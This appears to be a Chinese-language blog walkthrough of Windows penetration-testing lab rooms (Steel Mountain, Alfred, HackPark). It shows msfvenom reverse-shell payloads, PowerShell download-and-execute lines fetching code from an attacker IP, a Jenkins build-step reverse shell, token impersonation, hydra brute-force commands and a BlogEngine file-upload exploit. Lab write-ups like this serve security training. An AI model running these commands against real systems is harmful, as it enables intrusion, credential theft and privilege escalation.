<span class="token property">Name</span>                            <span class="token punctuation">:</span> LiveUpdateSvc                                                       
<span class="token property">Check</span>                           <span class="token punctuation">:</span> Modifiable Service Files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="image-20240404114223928.png" alt="image-20240404114223928"></p>
<p>查看输出，有一个特定服务的 CanRestart 选项被设置为 true，此选项被设置为 true 后，我们就能够在系统上重新启动此服务；而且这个应用程序的目录也是可写的，这意味着我们可以用一个恶意应用程序替换合法的应用程序，一旦服务重新启动，我们的恶意程序将运行。</p>
<blockquote>
<p>ServiceName ：AdvancedSystemCareService9</p>
<p>ModifiablePath：C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe</p>
</blockquote>
<p>msfvenom可用于生成反向shell的payload并将其输出为windows可执行文件，我们用msfvenom来生成一个和之前的应用程序同名的恶意应用程序:</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">#msfvenom -p windows/shell_reverse_tcp LHOST=&lt;local_ip&gt; LPORT=&lt;local_port&gt; -e x86/shikata_ga_nai -f exe-service -o filename.exe

msfvenom -p windows/shell_reverse_tcp LHOST=10.11.81.232 LPORT=8888 -e x86/shikata_ga_nai -f exe -o ASCService.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="image-20240404114726030.png" alt="image-20240404114726030"></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">meterpreter <span class="token operator">&gt;</span> upload /opt/windows/PowerSploit/ASCService.exe                                                                  
[*] <span class="token property">Uploading</span>  <span class="token punctuation">:</span> /opt/windows/PowerSploit/ASCService.exe -&gt; ASCService.exe                                                    
[*] Uploaded 72.07 KiB of 72.07 KiB <span class="token punctuation">(</span>100.0%<span class="token punctuation">)</span><span class="token punctuation">:</span> /opt/windows/PowerSploit/ASCService.exe -&gt; ASCService.exe                       
[*] <span class="token property">Completed</span>  <span class="token punctuation">:</span> /opt/windows/PowerSploit/ASCService.exe -&gt; ASCService.exe                                                    
meterpreter <span class="token operator">&gt;</span> shell                                                                                                           
Process 2412 created.                                                                                                         
Channel 6 created.                                                                                                            
Microsoft Windows [Version 6.3.9600]                                                                                          
<span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2013 Microsoft Corporation. All rights reserved.                                                                          
                                                                                                                              
<span class="token property">C</span><span class="token punctuation">:</span>\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt;sc stop AdvancedSystemCareService9                
sc stop AdvancedSystemCareService9                                                                                            
                                                                                                                              
<span class="token property">SERVICE_NAME</span><span class="token punctuation">:</span> AdvancedSystemCareService9                                                                                      
        <span class="token property">TYPE</span>               <span class="token punctuation">:</span> 110  WIN32_OWN_PROCESS  <span class="token punctuation">(</span>interactive<span class="token punctuation">)</span>                                                            
        <span class="token property">STATE</span>              <span class="token punctuation">:</span> 4  RUNNING                                                                                       
                                <span class="token punctuation">(</span>STOPPABLE<span class="token punctuation">,</span> PAUSABLE<span class="token punctuation">,</span> ACCEPTS_SHUTDOWN<span class="token punctuation">)</span>                                                       
        <span class="token property">WIN32_EXIT_CODE</span>    <span class="token punctuation">:</span> 0  <span class="token punctuation">(</span>0x0<span class="token punctuation">)</span>                                                                                         
        <span class="token property">SERVICE_EXIT_CODE</span>  <span class="token punctuation">:</span> 0  <span class="token punctuation">(</span>0x0<span class="token punctuation">)</span>                                                                                         
        <span class="token property">CHECKPOINT</span>         <span class="token punctuation">:</span> 0x0                                                                                              
        <span class="token property">WAIT_HINT</span>          <span class="token punctuation">:</span> 0x0                                                                                              
                                                                                                                              
<span class="token property">C</span><span class="token punctuation">:</span>\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt;dir                                               
dir                                                                                                                           
 Volume in drive C has no label.                                                                                              
 Volume Serial Number is 2E4A-906A                                                                                            
                                                                                                                              
 Directory of <span class="token property">C</span><span class="token punctuation">:</span>\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup                                     
                                                                                                                              
04/03/2024  <span class="token property">08</span><span class="token punctuation">:</span>48 PM              .                                                                                      
04/03/2024  <span class="token property">08</span><span class="token punctuation">:</span>48 PM              ..                                                                                     
04/03/2024  <span class="token property">08</span><span class="token punctuation">:</span>27 PM              <span class="token placeholder selector">%TEMP</span>%                                                                                 
04/03/2024  <span class="token property">08</span><span class="token punctuation">:</span>48 PM            73<span class="token punctuation">,</span>802 ASCService.exe                                                                         
02/16/2014  <span class="token property">01</span><span class="token punctuation">:</span>58 PM           760<span class="token punctuation">,</span>320 hfs.exe                                                                                
04/03/2024  <span class="token property">08</span><span class="token punctuation">:</span>38 PM           600<span class="token punctuation">,</span>580 PowerUp.ps1                                                                            
               3 <span class="token function">File</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>      1<span class="token punctuation">,</span>434<span class="token punctuation">,</span>702 bytes                                                                                 
               3 <span class="token function">Dir</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>  44<span class="token punctuation">,</span>154<span class="token punctuation">,</span>744<span class="token punctuation">,</span>832 bytes free                                                                            
                                                                                                                              
<span class="token property">C</span><span class="token punctuation">:</span>\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt;copy ASCService.exe <span class="token string">"C:\Program Files (x86)\IObit\
Advanced SystemCare\ASCService.exe"</span>                                                                                           
copy ASCService.exe <span class="token string">"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"</span>                                         
Overwrite <span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit\Advanced SystemCare\ASCService.exe? <span class="token punctuation">(</span>Yes/No/All<span class="token punctuation">)</span><span class="token punctuation">:</span> yes                                  
yes                                                                                                                           
        1 <span class="token function">file</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> copied.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>关于SC命令（Windows shell不区分大小写）：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">SC命令的格式：SC [Servername] command Servicename [Optionname= Optionvalues]

Servername：指定服务所在的远程服务器的名称。名称必须采用通用命名约定 <span class="token punctuation">(</span>UNC<span class="token punctuation">)</span> 格式（“\\myserver”）。如果是在本地运行SC.exe，请忽略此参数。
command ：如query<span class="token punctuation">,</span>start<span class="token punctuation">,</span>stop<span class="token punctuation">,</span>create<span class="token punctuation">,</span>config等

Servicename：服务名，也就是要配置的那个服务的名字，例如你要启动一个服务你就输入sc start +你要启动的服务名称（并非是服务显示名称）。
Optionname= Optionvalues：是选项名和选项的值。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在重新启动服务之前，我们需要在攻击机终端中设置一个netcat侦听器:<code>nc -lvnp 8888</code></p>
<p><img src="image-20240404115159187.png" alt="image-20240404115159187"></p>
<p><img src="image-20240404115309581.png" alt="image-20240404115309581"></p>
<h2 id="不使用Metasploit获取初始访问权限并提权">不使用Metasploit获取初始访问权限并提权</h2>
<p>注意：此处建议重启目标机。</p>
<p>现在，我们来看看如何在不使用 Metasploit 的情况下获得初始权限和进行权限提升。为此，我们将使用 PowerShell 和 winPEAS 来枚举目标系统并收集相关信息以提权到管理员用户。</p>
<p>我们还是使用之前提到的CVE编号所对应的漏洞来获取初始访问权限，然而，这次我们手动使用exp而不是通过msf来执行exp。</p>
<blockquote>
<p>exp链接（一个python脚本）：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/39161">https://www.exploit-db.com/exploits/39161</a></p>
</blockquote>
<p>为了使这种攻击起作用，需要同时激活Web服务器和netcat侦听器，如果你的系统上还没有 netcat 静态二进制文件，那么你可以从GitHub下载。我们还将使用 winPEAS来枚举目标机系统信息。</p>
<blockquote>
<p>netcat二进制文件：<a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe">https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe</a></p>
<p>winPEAS（在下载页选择winPEASx64.exe）：<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/releases/tag/20221009">https://github.com/carlospolop/PEASS-ng/releases/tag/20221009</a></p>
</blockquote>
<p>为了方便起见，我新建了一个文件夹放置刚才下载的三个文件（exp脚本使用之前–记得修改好ip和端口，下载的netcat二进制文件要修改名称为nc.exe）：</p>
<blockquote>
<p>查看exp脚本内容，我们能够发现该脚本已经指定要调用名称为nc.exe的文件</p>
</blockquote>
<p>然后需要开启3个独立的终端窗口来完成攻击：</p>
<p>终端1-通过python启用 HTTP web 服务器</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">#终端界面进入到SteelMountain目录
#python3 -m http.server 8000 无响应
python2 -m SimpleHTTPServer 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>终端2-设置netcat 监听器</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">nc -nvlp 8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>终端3-执行exp进行攻击（注意所用脚本的python版本）</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">#终端界面进入到/home/hekeats/桌面/SteelMountain目录
python2 39161.py 10.10.61.11 8080 #第一次执行会将SteelMountain/目录下的nc.exe上传到目标系统
python2 39161.py 10.10.61.11 8080 #第二次执行会发送一个反向shell回连到攻击机监听器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>在终端2界面 成功获取目标机的shell：（这里我执行了三次才行，估计是某些问题吧，应该是两次的）</p>
<p><img src="image-20240404121817057.png" alt="image-20240404121817057"></p>
<p>使用Powershell相关命令将winPEAS脚本拉取到目标系统上：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">#使用终端2界面
cd <span class="token property">C</span><span class="token punctuation">:</span>\Users\Bill\Desktop
#Format is <span class="token string">"powershell -c "</span>command here"
powershell -c wget <span class="token string">"http://10.11.81.232/winPEASx64.exe"</span> -outfile <span class="token string">"winPEAS.exe"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行winPEAS脚本（枚举目标系统的信息，如服务名称等）：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">#使用终端2界面
winPEAS.exe
#我们也可以运行powershell -c 命令手动查找服务名称<span class="token punctuation">:</span>powershell -c <span class="token string">"Get-Service"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="image-20240404122133962.png" alt="image-20240404122133962"></p>
<p>运行winPEAS之后，查看输出的服务信息，观察在运行时"未引用路径"的服务名称：</p>
<p><img src="image-20240404122406649.png" alt="image-20240404122406649"></p>
<p>使用msfvenom生成一个exe形式的反向shell payload，输出的文件名和服务对应的文件名相同（此处payload设置的端口，不要使用刚刚建立普通shell的端口）：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">#使用终端3界面
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.81.232 LPORT=8888 -e x86/shikata_ga_nai -f exe -o ASCService.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>然后可以通过 PowerShell 将这些数据传输到目标系统中:</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">#使用终端2界面
powershell -c wget <span class="token string">"http://10.11.81.232/ASCService.exe"</span> -outfile <span class="token string">"ASCService.exe"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="image-20240404122642856.png" alt="image-20240404122642856"></p>
<p><img src="image-20240404122744379.png" alt="image-20240404122744379"></p>
<p><img src="image-20240404122913091.png" alt="image-20240404122913091"></p>
<p><img src="image-20240404122923329.png" alt="image-20240404122923329"></p>
<h2 id="总结-4">总结</h2>
<p>依旧是nmap扫描，这里靠的是目标站web站点的漏洞，其中使用的是rejetto http file server，发现存在对应漏洞，接着利用msf成功拿到shell，接着就是提权，首先是通过powershell某个脚本，枚举出对方服务器的某个服务存存在配置错误问题，接着msfvenom生成了一个reverse_shell木马，上传到目标机，替换对应服务的exe之后，重新运行，拿到system权限。</p>
<p>然后还介绍了一个不通过msf提权的方法，主要就是利用exploit漏洞库对应的cve脚本，凭借该脚本利用方式还需要准备，nc.exe，winPEAS.exe，接着先监听拿到shell，上传winPEAS.exe来枚举靶机发现存在没有使用双引号引用路径的脆弱服务，按照上面的思路，依旧是替换他，重新运行，也是成功提权</p>
<h1>0x05 Alfred挑战</h1>
<p>在这个房间里，我们将学习如何利用广泛使用的自动化服务器上的常见错误配置（Jenkins - 此工具用于创建持续集成/持续开发管道，允许开发人员在对代码进行更改后自动部署其代码）。之后，我们将使用一个有趣的权限提升方法来获得完整的系统访问权限。</p>
<p>由于这是一个 Windows 应用程序，我们将使用 Nishang 来获得初始访问权限。存储库包含一组有用的脚本，用于初始访问、枚举和权限提升。在本例中，我们将使用反向 shell 脚本。</p>
<p>请注意，此计算机不响应 ping （ICMP），可能需要几分钟才能启动。——我说怎么ping不通，以为我自己的问题</p>
<h2 id="初始访问-2">初始访问</h2>
<p>直接上nmap扫描：<code>nmap -T5 -sV -sC 10.10.40.248 -Pn</code></p>
<p><img src="image-20240406100639144.png" alt="image-20240406100639144"></p>
<p>接下来一个个访问发现在8080存在一个Jenkins工具，找到其工具下的一个命令执行功能，上传对应的powershell反弹shell脚本，最后执行，具体如下图</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">powershell iex <span class="token punctuation">(</span>New-Object Net.WebClient<span class="token punctuation">)</span>.<span class="token function">DownloadString</span><span class="token punctuation">(</span><span class="token string">'http://10.11.81.232:81/Invoke-PowerShellTcp.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Invoke-PowerShellTcp -Reverse -IPAddress 10.11.81.232 -Port 5555
<span class="token comment">//构建好payload</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>如下图，在首页点击new item创建新项目，接着到build功能下，写入payload，最后点击apply再save保存</p>
<p><img src="image-20240406104128713.png" alt="image-20240406104128713"></p>
<p>保存来到首页，点击build now，发现得到shell</p>
<p><img src="image-20240406104258342.png" alt="image-20240406104258342"></p>
<p><img src="image-20240406104312253.png" alt="image-20240406104312253"></p>
<p><img src="image-20240406104620515.png" alt="image-20240406104620515"></p>
<p><img src="image-20240406104630421.png" alt="image-20240406104630421"></p>
<h2 id="切换shell">切换shell</h2>
<p>为了使权限提升变得更容易，让我们使用以下过程切换普通的反向shell到 Meterpreter shell。</p>
<p>第一步使用 msfvenom 创建一个能够生成Windows Meterpreter 反向shell的exe文件：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.81.232 LPORT=5555 -f exe -o hybcx.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>以上有效载荷将生成一个经过编码处理的 x86-64 反向 tcp meterpreter shell文件，使用编码处理在一定程度上可以确保所生成的shell文件能够被正确传输，并且还可以逃避一些反病毒软件。</p>
<p>第二步，把生成的exe文件转移到nishang/Shells目录下，在nishang/Shells目录下创建http服务（<code>python3 -m http.server 8000</code>），继续修改以下命令：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">powershell <span class="token string">"(New-Object System.Net.WebClient).Downloadfile('http://10.11.81.232:81/hybcx.exe','hybcx.exe')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>进入之前获取的普通反向shell界面，运行以上命令：以上命令会下载攻击机中的指定exe文件到目标机上（也可以使用与上个任务相同的方式来下载exe文件至目标机）</p>
<p><img src="image-20240406105923360.png" alt="image-20240406105923360"></p>
<p>第三步，在攻击机上另外启动一个终端 用于设置MSF监听器，命令如下：</p>
<p><img src="image-20240406105953592.png" alt="image-20240406105953592"></p>
<p>之后靶机上启动对应exe程序</p>
<p><img src="image-20240406110040068.png" alt="image-20240406110040068"></p>
<p><img src="image-20240406110034640.png" alt="image-20240406110034640"></p>
<h2 id="权限提升-3">权限提升</h2>
<p>现在我们有了初始访问权限，我们就可以尝试使用令牌模拟来获得system访问权限（system权限是Windows系统中的最高级别权限）。Windows 可以使用令牌来确保某个账户具有执行特定操作的正确权限，当用户成功登录或通过身份验证机制时，账户令牌（tokens ）就会被分配给账户，这通常由 LSASS.exe 完成（你可以将其视为一个身份验证进程）。</p>
<p>此访问令牌包括以下信息：</p>
<ul>
<li>user SIDs(security identifier)</li>
<li>group SIDs</li>
<li>privileges</li>
</ul>
<p>除其他事项外，更详细的信息请参考：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens">https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens</a></p>
<p>有两种类型的访问令牌：</p>
<ul>
<li>主访问令牌(primary access tokens)：此类令牌是指与登录时所生成的用户账户相关联的令牌。</li>
<li>模拟令牌(impersonation tokens)：此类令牌能够允许特定进程（或进程中的线程）使用另一个（用户/客户端）进程的令牌来访问相关的资源。</li>
</ul>
<p>对于模拟令牌，有不同的级别：</p>
<ul>
<li>SecurityAnonymous：当前 用户/客户端 不能模拟另一个 用户/客户端。</li>
<li>SecurityIdentification：当前 用户/客户端 可以获得客户端的身份和权限，但不能模拟客户端。</li>
<li>SecurityImpersonation：当前 用户/客户端 可以在本地系统上模拟客户端的安全上下文。</li>
<li>SecurityDelegation：当前 用户/客户端 可以在远程系统上模拟客户端的安全上下文。</li>
</ul>
<p>tips：这里的安全上下文是指一个包含用户相关安全信息的数据结构。</p>
<p>账户所具有的权限（在账户创建时授予账户的权限或者从group处继承的权限）能够允许对应用户执行一些特定操作，以下是最常被滥用的特权：</p>
<ul>
<li>SeImpersonatePrivilege</li>
<li>SeAssignPrimaryPrivilege</li>
<li>SeTcbPrivilege</li>
<li>SeBackupPrivilege</li>
<li>SeRestorePrivilege</li>
<li>SeCreateTokenPrivilege</li>
<li>SeLoadDriverPrivilege</li>
<li>SeTakeOwnershipPrivilege</li>
<li>SeDebugPrivilege</li>
</ul>
<p>更多关于令牌特权滥用的信息请参考：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/papers/42556">https://www.exploit-db.com/papers/42556</a></p>
<p>输入whoami /priv查看当前用户所有权限</p>
<p><img src="image-20240406110447285.png" alt="image-20240406110447285"></p>
<p>可以看到目标机启用了两个关键权限（SeDebugPrivilege、SeImpersonatePrivilege），这两个权限能够让我们使用MSF中的模块来进行令牌模拟操作</p>
<p>接着在meterpreter shell中load incognito</p>
<p><img src="image-20240406110619956.png" alt="image-20240406110619956"></p>
<p>模块加载完成之后 输入<code>list_tokens -g</code>命令检查哪些令牌可用，我们发现<code>BUILTIN\Administrators</code>令牌可用，所以我们可以模拟管理员令牌，模拟完成后，再运行<code>getuid</code>命令，可以看到此时我们的uid已经变更为SYSTEM的uid，说明模拟令牌成功。</p>
<p><img src="image-20240406110822892.png" alt="image-20240406110822892"></p>
<p>即使我们现在拥有更高特权的令牌（token ），我们实际上也可能没有对应的特权用户的权限（由于 Windows 处理权限的方式 - Windows会使用主令牌而不是模拟令牌来确定某个进程的权限分配情况）；所以我们还需要迁移到具有正确权限的进程，我们可以选择迁移到最安全的services.exe进程，首先使用ps命令查看所有进程，找到services.exe进程的PID，然后使用<code>migrate PID-OF-PROCESS</code>迁移到目标进程，具体命令如下：</p>
<p><img src="image-20240406110957645.png" alt="image-20240406110957645"></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">getpid #查看当前进程pid
ps #查看所有的进程
migrate 668 #迁移到services.exe进程 需指定目标进程的PID号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="image-20240406111038153.png" alt="image-20240406111038153"></p>
<p><img src="image-20240406111115419.png" alt="image-20240406111115419"></p>
<h2 id="总结-5">总结</h2>
<p>依旧是利用靶机的web站点缺点，对方含有jenkins组件，该组件的版本恰好存在漏洞，利用其中的某个功能能够执行命令，接着利用其执行了powershell的反弹shell脚本，nc监听拿到shell，之后为了稳定+方便，要切换到meterpreter shell，思路是msfvenom生成meterpreter reverse_shell上传到靶机之后，运行（在本地开了msf监听模块）之后成功拿到shell，之后利用模仿令牌来提权，load incognito看到对方可以模仿的令牌之后，利用命令成功模仿，但我们当前是模仿令牌但不是主令牌，因此需要migrate迁移到正确权限的程序，之后就成功提权（这里我没有尝试直接迁移会如何，下次得记着）。</p>
<h1>0x06 HackPark挑战</h1>
<p>连接到我们的网络并部署这台机器。请耐心等待，因为这台机器最多可能需要 5 分钟才能启动！您可以通过访问我们的访问页面来测试您是否连接到我们的网络。请注意，此计算机不响应 ping （ICMP），可能需要几分钟才能启动。</p>
<p>本会议室将介绍暴力破解帐户凭据、处理公共漏洞、使用 Metasploit 框架和 Windows 上的权限升级。</p>
<h2 id="hydra暴力破解">hydra暴力破解</h2>
<p>Hydra 是一种并行化、快速且灵活的登录破解工具。</p>
<p>暴力破解会尝试使用多种密码组合进行登录。 字典攻击也是一种暴力破解，我们可以通过字典内容迭代来获取正确的密码组合。</p>
<p>我们需要找到一个登录页面来攻击并确定表单向网络服务器发出的请求类型。通常，Web 服务器发出两种类型的请求，一种是用于从 Web 服务器请求数据的 GET 请求，另一种是用于向服务器发送数据的 POST 请求。</p>
<p>您可以通过右键单击登录表单，检查元素，然后读取方法字段中的值来检查表单发出的请求。如果您通过 BurpSuite 拦截流量，您也可以识别这一点（可以在此处找到其他 <a target="_blank" rel="noopener" href="https://www.w3schools.com/tags/ref_httpmethods.asp">HTTP 方法</a>）。</p>
<p>Windows 网站登录表单使用什么请求类型？——POST类型</p>
<p><img src="image-20240406112916602.png" alt="image-20240406112916602"></p>
<p>现在我们知道请求类型和登录表单的 URL，我们可以使用hydra对登陆框进行暴力破解。</p>
<p>我们将填充并使用以下命令：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">hydra -l &lt;username&gt; -P /usr/share/wordlists/&lt;wordlist&gt; &lt;ip&gt; http-post-form &lt;login request pattern&gt;

#关于http-post-form：<span class="token string">"&lt;path to login form&gt;:&lt;body, with magic strings ^USER^ and ^PASS^&gt;:&lt;pattern that appears in an invalid login&gt;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>需要填充的字段有：用户名（admin）和IP(靶机IP)以及字典（rockyou.txt），在http-post-from后加上网站登陆页的URL以及POST请求所对应的表单数据（表单数据可通过Burp抓取或者在浏览器端直接查看），其中用户名和密码要修改格式（USER和PASS），最后再加上登录错误时的提示语句“Login failed”（将浏览器语言设置为英文）。</p>
<p>具体命令如下：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.9.70 http-post-form <span class="token string">"/Account/login.aspx:__VIEWSTATE=A79cd%2Fd56MBqXHayonGgo9MFuFbQU6QPgXzIC%2B9FMhzTK7iMPj4zufjKqn3GNZWqtmDPLnM3RtK7TkB%2BYvlEkWuMDAJirSykwjQ%2FxVGWAv5Cyji4ywzRTSm9iL8I8dMNvvhWDbZe6qWUFX%2FEOOnmbrp1mU4IPOxzJGSnYTY2CNw6wYAJHPUHh%2FB388uvKDteVckgTZtgt66yI8xd5etFdURzNBbnCs4dJswVuPShvKWGKbJUyHFJ5jadz4XvkArprAEcDAd9Ll%2F5zkDvEiLHoGYMwRJLCQj05O1NF7MYjsnmc0WKGMfbhqXmWkGAwpvRJolCxYkjmJfsevJUigud7%2BppQIWb%2BVcVi00Eo8qr1RtOJ%2FKB&amp;__EVENTVALIDATION=QRBLSmDgKfpCrfL79eVdKup%2FRJ91Bmhgi7SgxOupvZnLmSVshmyDfmOIr%2BKc%2FyeXqYKrM4YA%2FHCfDF3SfBc%2BT1Wpxa9ownCMxyjUQ5Y3drEvWm11h2mdfvuiMXcRGqkQ7Li8bDSDDgR13qwydwbPI6xcL1ciNTevksX%2BsVcHfSVf8W1w&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240406114001866.png" alt="image-20240406114001866">d</p>
<p>这里需要将浏览器语言设置为英文，还需要配置登陆失败提示语（页面回显发现的）</p>
<p><img src="image-20240406114850137.png" alt="image-20240406114850137"></p>
<p>Hydra 有很多功能，并且有许多可用的“模块”（我们刚才使用的 http-post-form就是模块的一种），此工具不仅适用于暴力破解 HTTP 表单，还适用于破解其他计算机协议相关的登陆密码，例如 FTP、SSH、SMTP、SMB 等协议。</p>
<p>下面是一个关于Hydra的迷你备忘单：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">命令                                                                                  说明
hydra -P &lt;wordlist&gt; -v &lt;ip&gt; &lt;protocol&gt;                                        针对某一协议进行暴力破解操作

hydra -v -V -u -L &lt;username list&gt; -P &lt;password list&gt; -t 1 -u &lt;ip&gt; &lt;protocol&gt;  使用Hydra来暴力破解用户名和密码（-vV：表示使用详细模式）。

hydra -t 1 -V -f -l &lt;username&gt; -P &lt;wordlist&gt; <span class="token property">rdp</span><span class="token punctuation">:</span><span class="token comment">//&lt;ip&gt;                       使用密码字典以攻击Windows远程桌面主机。</span>

hydra -l &lt;username&gt; -P &lt;password list&gt; <span class="token variable">$ip</span> -V http-form-post <span class="token string">'/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location'</span>                                                   为Hydra提供更具体的信息以进行暴力破解操作。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="获取目标web应用程序的初始shell">获取目标web应用程序的初始shell</h2>
<p>识别并执行一个公共漏洞利用脚本（来自 <a target="_blank" rel="noopener" href="http://exploit-db.com">exploit-db.com</a>）以在目标Windows机器上获得初始访问权限！</p>
<p>Exploit-Database 是一个 CVE（常见漏洞和泄露）存档库，该库用于保存一些公开漏洞exp和相应的易受攻击的软件信息，以便于渗透测试人员使用和开展漏洞研究。Exploit-Database 由 Offensive Security组织所维护（该组织同时也负责OSCP和Kali）。</p>
<p><img src="image-20240406115421648.png" alt="image-20240406115421648"></p>
<p>登录进去之后发现该网站所使用的框架，上exploit搜索相关漏洞</p>
<p><img src="image-20240406115711049.png" alt="image-20240406115711049"></p>
<p>搜到之后，跟着目录描述一步步拿到shell</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">First<span class="token punctuation">,</span> we set the TcpClient address <span class="token operator">and</span> port within the method below to 
 <span class="token operator">*</span> our attack host<span class="token punctuation">,</span> who has a reverse tcp listener waiting for a connection.
 <span class="token operator">*</span> Next<span class="token punctuation">,</span> we upload this file <span class="token keyword">through</span> the file manager.  In the current <span class="token punctuation">(</span>3.3.6<span class="token punctuation">)</span>
 <span class="token operator">*</span> version of BlogEngine<span class="token punctuation">,</span> this is done by editing a post <span class="token operator">and</span> clicking on the 
 <span class="token operator">*</span> icon that looks like an open file in the toolbar.  Note that this file must
 <span class="token operator">*</span> be uploaded <span class="token module-modifier keyword">as</span> PostView.ascx. Once uploaded<span class="token punctuation">,</span> the file will be in the
 <span class="token operator">*</span> /App_Data/files directory off of the document root. The admin page that
 <span class="token operator">*</span> allows upload <span class="token property">is</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>简单说就是现在exp文件修改监听端口和IP，接着在如下图所示的地方上传文件，注意文件名必须是PostView.ascx</p>
<p><img src="image-20240406122243917.png" alt="image-20240406122243917"></p>
<p>之后访问指定目录：<code>http://IP/?theme=../../App_Data/files</code>即可拿到shell</p>
<p><img src="image-20240406122138295.png" alt="image-20240406122138295"></p>
